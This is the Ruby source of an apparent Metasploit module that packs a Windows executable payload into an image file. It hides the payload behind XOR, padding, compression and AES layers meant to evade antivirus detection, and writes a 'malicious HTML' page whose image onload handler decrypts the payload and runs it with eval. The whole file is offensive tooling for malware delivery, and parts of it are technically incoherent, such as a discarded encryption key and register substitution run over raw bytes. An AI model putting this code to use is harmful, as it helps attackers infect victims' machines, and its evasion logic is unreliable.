# frozen_string_literal: true

require 'msf/core'
require 'securerandom'
require 'rex/zip'
require 'zlib'
require 'openssl'

module EmbeddedImagePayload
  class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::EXE
    include Msf::Exploit::Remote::HttpServer::HTML

    def initialize(info = {})
      super(update_info(info,
                        'Name' => 'Advanced Image Payload Embedder',
                        'Description' => 'This module embeds a payload into an image file and generates a malicious HTML file.',
                        'Author' => ['WebMaster-Exit-1'],
                        'License' => MSF_LICENSE,
                        'Platform' => 'win',
                        'Targets' => [['Windows', {}]],
                        'DefaultTarget' => 0,
                        'Payload' => {
                          'DisableNops' => true
                        }))

      register_options([
                         OptString.new('IMAGE_PATH', [true, 'Path to the image file']),
                         OptString.new('OUTPUT_PATH', [true, 'Path to save the malicious HTML file'])
                       ])
    end

    def generate_random_key(length)
      SecureRandom.random_bytes(length)
    end

    def xor_encrypt(payload, key)
      key_bytes = key.bytes.cycle
      payload.bytes.zip(key_bytes).map { |payload_byte, key_byte| payload_byte ^ key_byte }.pack('C*')
    end

    def generate_polymorphic_payload(original_payload)
      nop_count = rand(1..10)
      nops = "\x90" * nop_count
      polymorphic_payload = nops + original_payload

      # Randomize register usage
      polymorphic_payload.gsub!('[eax]', "[#{%w[eax ebx ecx edx].sample}]")
      polymorphic_payload.gsub!('[ebx]', "[#{%w[eax ebx ecx edx].sample}]")
      polymorphic_payload.gsub!('[ecx]', "[#{%w[eax ebx ecx edx].sample}]")
      polymorphic_payload.gsub!('[edx]', "[#{%w[eax ebx ecx edx].sample}]")

      # Insert junk code
      junk_code = "\x90" * rand(1..5)
      insert_index = rand(0...polymorphic_payload.length)
      polymorphic_payload.insert(insert_index, junk_code)

      # Don't shuffle instructions to avoid breaking the payload
      polymorphic_payload
    end

    def heuristic_technique(payload)
      # Encode, compress, and encrypt payload
      encoded_payload = Rex::Text.encode_base64(payload)
      compressed_payload = Zlib::Deflate.deflate(encoded_payload)
      key = generate_random_key(32)
      cipher = OpenSSL::Cipher.new('AES-256-CBC')
      cipher.encrypt
      cipher.key = key
      iv = cipher.random_iv
      encrypted_payload = cipher.update(compressed_payload) + cipher.final

      # Obfuscate key and IV
      obfuscated_key = key.unpack('H*')[0].scan(/../).map { |hex| "\\x#{hex}" }.join
      obfuscated_iv = iv.unpack('H*')[0].scan(/../).map { |hex| "\\x#{hex}" }.join

      decryption_routine = <<~RUBY
        function decryptAndRun() {
          var key = new Uint8Array([#{obfuscated_key.gsub('\\x', ',0x')}]);
          var iv = new Uint8Array([#{obfuscated_iv.gsub('\\x', ',0x')}]);
          var encrypted = new Uint8Array([#{encrypted_payload.bytes.join(',')}]);
          var decipher = new CryptoJS.algo.AES.createDecryptor(CryptoJS.lib.WordArray.create(key), CryptoJS.lib.WordArray.create(iv));
          var decrypted = decipher.process(CryptoJS.lib.WordArray.create(encrypted)).toString(CryptoJS.enc.Utf8);
          var decompressed = pako.inflate(decrypted, { to: 'string' });
          var decoded = atob(decompressed);
          eval(decoded);
        }
      RUBY

      # Note: This assumes you have CryptoJS and Pako included in your HTML for AES and zlib operations
      Rex::Text.encode_base64(decryption_routine)
    end

    def embed_payload_into_image(image_path, payload)
      image_data = File.binread(image_path)
      zip_data = Rex::Zip::Archive.new
      zip_data.add_file('payload.bin', payload)
      zip_data.add_file('image.jpg', image_data)
      zip_data.pack
    end

    def generate_malicious_html(image_path, payload_bytes)
      payload_array = payload_bytes.unpack('C*')
      <<~HTML
        <!DOCTYPE html>
        <html>
        <head>
          <title>Malicious Image</title>
          <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
          <script src="https://cdn.jsdelivr.net/npm/pako@2.0.4/dist/pako.min.js"></script>
        </head>
        <body>
          <img src="#{image_path}" alt="Malicious Image" onload="decryptAndRun()">
          <script>
            #{Rex::Text.decode_base64(heuristic_technique(payload_bytes))}
          </script>
        </body>
        </html>
      HTML
    end

    def exploit
      begin
        image_path = datastore['IMAGE_PATH']
        output_path = datastore['OUTPUT_PATH']

        payload_data = generate_payload_exe
        key = generate_random_key(16)
        encrypted_payload = xor_encrypt(payload_data, key)
        polymorphic_payload = generate_polymorphic_payload(encrypted_payload)
        final_payload = heuristic_technique(polymorphic_payload)

        embedded_data = embed_payload_into_image(image_path, final_payload)
        File.binwrite(image_path, embedded_data)
        print_good("Payload successfully embedded into #{image_path}")

        malicious_html = generate_malicious_html(image_path, final_payload)
        File.write(output_path, malicious_html)
        print_good("Malicious HTML file generated at #{output_path}")
      rescue => e
        print_error("An error occurred: #{e.message}")
        raise e  # Re-raise for detailed stack trace if needed
      end
      super
    end
  end
end